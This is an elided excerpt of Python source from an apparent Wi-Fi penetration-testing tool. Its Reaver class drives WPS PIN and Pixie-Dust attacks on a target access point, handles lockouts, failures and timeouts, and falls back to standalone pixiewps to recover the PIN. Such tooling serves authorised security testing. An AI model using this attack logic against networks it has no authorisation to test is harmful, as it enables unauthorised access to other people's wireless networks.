...
from .pixiewps import Pixiewps # for standalone pixiewps integration
...
try:
    from ..gui.error_handler import AttackError, TimeoutError
except ImportError:
    # Fallback for when GUI module is not available. Use internal names
    # and assign them to the public identifiers to avoid type checker conflicts.
    class _ReaverAttackError(Exception):
        pass

    class _ReaverTimeoutError(Exception):
        pass

    AttackError = _ReaverAttackError  # type: ignore[assignment]
    TimeoutError = _ReaverTimeoutError  # type: ignore[assignment]
...
class Reaver(Attack, Dependency):
    ...
    def __init__(self, target, pixie_dust=True):
        ...
        self.reaver_cmd = Process.build_wps_command('reaver', target, Configuration.interface, pixie_dust)
    ...
    def is_pixiedust_supported():
        ...
        try:
            ...
            return '--pixie-dust' in output or '-K' in output
        except Exception:
            return False
    ...
    def _run(self):
        ...
        with Airodump(channel=self.target.channel,
            ...
            self.reaver_proc = Process(self.reaver_cmd,
                    stdout=self.output_write,  # type: ignore
                    stderr=subprocess.DEVNULL)
            # Say "yes" if asked to restore session.
            if self.reaver_proc.pid.stdin:
                self.reaver_proc.pid.stdin.write(b'y\n')
                self.reaver_proc.pid.stdin.flush()
            ...
            while self.crack_result is None and self.reaver_proc.poll() is None:
                ...
                if self.locked and not Configuration.wps_ignore_lock:
                    raise AttackError('Access point is locked')

                # Add global timeout check for both pixie-dust and PIN attacks
                timeout_value = Configuration.wps_pixie_timeout if self.pixie_dust else getattr(Configuration, 'wps_pin_timeout', Configuration.wps_pixie_timeout)
                if self.running_time() > timeout_value:
                    raise TimeoutError('Timeout after %d seconds' % timeout_value)
            ...
            if self.crack_result is None and self.reaver_proc.poll() is not None:
                raise AttackError('Reaver process stopped (exit code: %s)' % self.reaver_proc.poll())
    ...
    def parse_failure(self, stdout):
        ...
        if 'WPS pin not found' in stdout:
            raise AttackError('Reaver says "WPS pin not found"')

        # Pixie-Dust specific failures
        if self.pixie_dust:
            if 'Pixiewps failed' in stdout or 'pixiewps failed' in stdout:
                # Try standalone pixiewps as fallback
                self.try_standalone_pixiewps(stdout)
                raise AttackError('Pixiewps failed to crack the PIN')
            if 'Pixie-Dust attack failed' in stdout:
                raise AttackError('Pixie-Dust attack failed')

        # WPSFail count
        self.total_wpsfails = stdout.count('WPS transaction failed')
        if self.total_wpsfails >= Configuration.wps_fail_threshold:
            raise AttackError('Too many failures (%d)' % self.total_wpsfails)

        # Timeout count
        self.total_timeouts = stdout.count('Receive timeout occurred')
        if self.total_timeouts >= Configuration.wps_timeout_threshold:
            raise TimeoutError('Too many timeouts (%d)' % self.total_timeouts)
    ...
    def parse_state(self, stdout):
        ...
        # Handle initialization and startup messages
        elif 'Initializing' in stdout_last_line or 'Starting' in stdout_last_line:
            state = 'Initializing'
            
        # Handle timeout messages
        elif 'timeout' in stdout_last_line.lower():
            state = 'Timeout'
    ...
    def pattack(self, message, newline=False):
        ...
        if self.total_attempts > 0 and not self.pixie_dust:
            ...
            # Add timeout and failure counts for better debugging
            if self.total_timeouts > 0:
                time_msg += ' {O}(Timeouts:%d){W}' % self.total_timeouts
            if self.total_wpsfails > 0:
                time_msg += ' {R}(WPSFails:%d){W}' % self.total_wpsfails
    ...
    def try_standalone_pixiewps(self, stdout):
        '''
        Attempts to use standalone pixiewps tool as fallback
        when Reaver's built-in pixiewps fails
        '''
        if not Pixiewps.exists():
            return None
            
        Color.pl('\n{+} {C}Trying standalone pixiewps{W} as fallback...')
        
        # Extract parameters from Reaver output
        params = Pixiewps.extract_parameters_from_reaver_output(stdout)
        if not params:
            Color.pl('{!} {O}Could not extract pixiewps parameters from Reaver output{W}')
            return None
        
        # Try to crack with standalone pixiewps
        pin = Pixiewps.crack_pin(**params)
        if pin:
            Color.pl('{+} {G}Standalone pixiewps found PIN: {C}%s{W}' % pin)
            # Create crack result
            self.crack_result = CrackResultWPS(self.target.bssid, self.target.essid, pin, None)
            return pin
        else:
            Color.pl('{!} {O}Standalone pixiewps also failed{W}')
            return None
...
'''
    ...
    # From vom513 in https://github.com/iga2x/wifitex/issues/60
    new_stdout = '''
